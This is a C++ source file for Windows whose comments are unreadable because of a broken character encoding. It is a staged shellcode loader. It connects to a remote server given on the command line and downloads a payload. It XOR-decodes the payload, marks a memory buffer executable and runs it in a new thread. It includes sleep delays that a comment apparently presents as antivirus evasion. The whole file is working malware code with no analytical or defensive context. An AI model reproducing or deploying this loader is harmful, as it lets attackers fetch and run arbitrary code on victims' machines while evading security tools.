#include <stdio.h>
#include <iostream>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")  //���ws2_32��̬��
#pragma warning(disable:4996) //���Ծɺ���ʹ�õľ���

using namespace std;

int main(int argc, char *argv[])
{
	const int BUF_SIZE = 1024;

	WSADATA			wsd; //WSADATA����
	SOCKET			sHost; // �������׽���socket
	SOCKADDR_IN		servAddr; //��������ַ
	char			buf[BUF_SIZE]; // ��ŷ��͵����ݻ�����
	char			bufRecv[BUF_SIZE]; //�����յ������ݻ�����
	DWORD			dwThreadId;
	HANDLE			hThread;
	DWORD			dwOldProtect;

	int retVal; // ����ֵ

	if (argc <= 2){
		cout << "USAGE: client.exe <Server IP> <Server PORT>" << endl;
		return -1;
	}

	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0) //��ʼ���׽��ֶ�̬��
	{
		cout << "WSAStartup failed!" << endl;
		return -1;
	}

	sHost = socket(AF_INET, SOCK_STREAM, 0); //�����׽��� IPV4  �ɿ��ģ�˫������ͷ����ṩ��ѡ��
	if (INVALID_SOCKET == sHost)
	{
		cout << "socket failed!" << endl;
		WSACleanup();
		return  -1;
	}

	//���÷������ĵ�ַ
	servAddr.sin_family = AF_INET; //ָ��IPV4
	servAddr.sin_addr.s_addr = inet_addr(argv[1]); // ָ���������ĵ�ַ
	servAddr.sin_port = htons((short)atoi(argv[2])); // ָ���������Ķ˿�



	retVal = connect(sHost, (LPSOCKADDR)&servAddr, sizeof(servAddr)); // �׽��� sockaddr��ָ�룬Ҳ���ǵ�ַ ����������ΪSOCKADDR_IN�ṹ��Ĵ�С
	if (SOCKET_ERROR == retVal) //�ж��Ƿ����ӳɹ�
	{
		cout << "connect failed!" << endl;
		closesocket(sHost);
		WSACleanup();
		return -1;
	}
	ZeroMemory(buf, BUF_SIZE); // bufָ��ĵ�ַ��0�����
	strcpy(buf, "ok"); //��ok�����ֽڵ��ַ������Ƹ�buf����

	retVal = send(sHost, buf, strlen(buf), 0); //send�ķ���ֵ

	if (SOCKET_ERROR == retVal) //�ж��Ƿ��ͳɹ�
	{
		cout << "send failed!" << endl;
		closesocket(sHost);
		WSACleanup();
		return -1;
	}
	cout << "Starting Download Payload" << endl;
	ZeroMemory(bufRecv, BUF_SIZE); // bufRevcָ��ĵ�ַ��0�����
	Sleep(2000); //�ӳ���������ɱ�ƹ���Ч��
	cout << "Downloading." << endl;

	recv(sHost, bufRecv, BUF_SIZE, 0); //bufRecv���������� ����˷�����������
	cout << "OK." << endl;

	Sleep(4000);
	closesocket(sHost);
	WSACleanup();
	for (int i = 0; i < sizeof(bufRecv); i++) {
		//Sleep(50);
		_InterlockedXor8(bufRecv + i, 10);
	}
	cout << "Start Load Shellcode" << endl;
	//������ǿ����ڴ�洢shellcode �����߳̽���ִ��
	char * shellcode = (char *)VirtualAlloc(
		NULL,
		BUF_SIZE,
		MEM_COMMIT,
		PAGE_READWRITE // ֻ����ɶ���д
	);

	CopyMemory(shellcode, bufRecv, BUF_SIZE);
	VirtualProtect(shellcode, BUF_SIZE, PAGE_EXECUTE, &dwOldProtect); // VirtualProtect�ı��������� -> ��ִ��

	hThread = CreateThread(
		NULL, // ��ȫ������
		NULL, // ջ�Ĵ�С
		(LPTHREAD_START_ROUTINE)shellcode, // ����
		NULL, // ����
		NULL, // �̱߳�־
		&dwThreadId // �߳�ID
	);

	WaitForSingleObject(hThread, INFINITE);
	return 0;
}